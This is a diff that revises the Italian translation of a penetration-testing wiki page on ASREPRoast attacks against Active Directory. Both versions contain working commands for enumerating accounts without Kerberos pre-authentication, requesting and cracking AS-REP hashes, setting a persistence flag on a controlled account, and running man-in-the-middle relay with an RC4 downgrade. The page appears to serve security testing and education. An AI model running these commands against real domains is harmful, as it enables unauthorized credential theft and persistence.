@@ -4,13 +4,13 @@
 
 ## ASREPRoast
 
-ASREPRoast è un attacco di sicurezza che sfrutta gli utenti che non dispongono dell'**attributo Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attacker di richiedere l'autenticazione per un utente dal Domain Controller (DC) senza bisogno della password dell'utente. Il DC risponde poi con un messaggio cifrato con la chiave derivata dalla password dell'utente, che gli attacker possono tentare di crack offline per scoprire la password dell'utente.
+ASREPRoast è un attacco di sicurezza che sfrutta gli utenti privi dell'attributo **Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attacker di richiedere l'autenticazione per un utente al Domain Controller (DC) senza aver bisogno della password dell'utente. Il DC risponde quindi con un messaggio cifrato con una chiave derivata dalla password dell'utente, che gli attacker possono tentare di crackare offline per scoprire la password dell'utente.
 
 I requisiti principali per questo attacco sono:
 
-- **Mancanza di Kerberos pre-authentication**: gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
-- **Connessione al Domain Controller (DC)**: gli attacker devono avere accesso al DC per inviare richieste e ricevere messaggi cifrati.
-- **Account di dominio opzionale**: avere un account di dominio consente agli attacker di identificare in modo più efficiente gli utenti vulnerabili tramite query LDAP. Senza un tale account, gli attacker devono indovinare i nomi utente.
+- **Lack of Kerberos pre-authentication**: gli utenti target non devono avere questa funzionalità di sicurezza abilitata.
+- **Connection to the Domain Controller (DC)**: gli attacker devono avere accesso al DC per inviare richieste e ricevere messaggi cifrati.
+- **Optional domain account**: disporre di un domain account consente agli attacker di identificare in modo più efficiente gli utenti vulnerabili tramite query LDAP. Senza tale account, gli attacker devono indovinare gli username.
 
 #### Enumerating vulnerable users (need domain credentials)
 ```bash:Using Windows
@@ -20,7 +20,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### Richiesta messaggio AS_REP
+#### Richiesta del messaggio AS_REP
 ```bash:Using Linux
 # Installed package entrypoint (same logic as GetNPUsers.py)
 impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
@@ -35,25 +35,25 @@ python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> Rubeus richiede **RC4** di default, quindi l'Event ID **4768** di solito mostra **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (o RC4 è disabilitato per il target), aspettati invece **AES etypes**.
+> Rubeus requests **RC4** by default, quindi l'Event ID **4768** mostra solitamente **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (oppure RC4 è disabilitato per il target), aspettati invece **AES etypes**.<sup>[[2]](#references)</sup>
 
-#### Quick one-liners (Linux)
+#### One-liner rapidi (Linux)
 
-- Enumera prima i potenziali target (ad es., da leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Roast un'intera lista di username senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
-- Se hai credenziali, fai interrogare LDAP a NetExec e richiedi per te ogni account roastable: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
-- Se l'output inizia con **`$krb5asrep$23$`**, crackalo con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John **`--format=krb5asrep`**.
+- Enumera prima i potenziali target (ad esempio, dai percorsi di build in leak) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Esegui il roast di un'intera lista di username senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
+- Se disponi di credenziali, lascia che NetExec interroghi LDAP e richieda per te ogni account vulnerabile al roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
+- Se l'output inizia con **`$krb5asrep$23$`**, esegui il cracking con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Cracking
 
-Non dare per scontato che ogni AS-REP roast sia RC4. I tool moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è per **etype 23**, mentre **John** gestisce `krb5asrep` direttamente per **17/18/23**.
+Non dare per scontato che ogni AS-REP roast utilizzi RC4. Gli strumenti moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è destinato a **etype 23**, mentre **John** gestisce direttamente `krb5asrep` per **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
 ```
-### Persistence
+### Persistenza
 
-Forza **preauth** non richiesto per un utente per cui hai permessi **GenericAll** (o permessi per scrivere proprietà):
+Forza **preauth** non richiesta per un utente per il quale disponi di autorizzazioni **GenericAll** (o di autorizzazioni per scrivere proprietà):
 ```bash:Using Windows
 # Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
@@ -67,10 +67,10 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove u
 ```
 ## ASREProast senza credenziali
 
-Un attacker può usare una posizione man-in-the-middle per catturare i pacchetti AS-REP mentre attraversano la rete senza fare affidamento sul fatto che la Kerberos pre-authentication sia disabilitata. Funziona quindi per tutti gli utenti sulla VLAN.\
-Se vuoi il relativo trick senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal no-preauth, vedi [Kerberoast](kerberoast.md).
+Un attacker può usare una posizione man-in-the-middle per catturare i pacchetti AS-REP mentre attraversano la rete, senza dover fare affidamento sulla disabilitazione della pre-autenticazione Kerberos. Funziona quindi per tutti gli utenti sulla VLAN.\
+Se vuoi il relativo trick senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal senza pre-auth, consulta [Kerberoast](kerberoast.md).
 
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci consente di farlo. La modalità `relay` è quella interessante in offensiva perché può forzare **RC4** quando il client pubblicizza ancora **etype 23**; `listen` resta passiva e si limita a catturare ciò che client/DC hanno negoziato.
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci permette di farlo. La modalità `relay` è quella interessante dal punto di vista offensivo, perché può forzare **RC4** quando il client pubblicizza ancora **etype 23**; `listen` rimane passiva e cattura semplicemente ciò che il client/DC negozia.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -81,12 +81,12 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-## References
+## Riferimenti
 
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
-- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
-- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
-- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
+- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
+- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
 
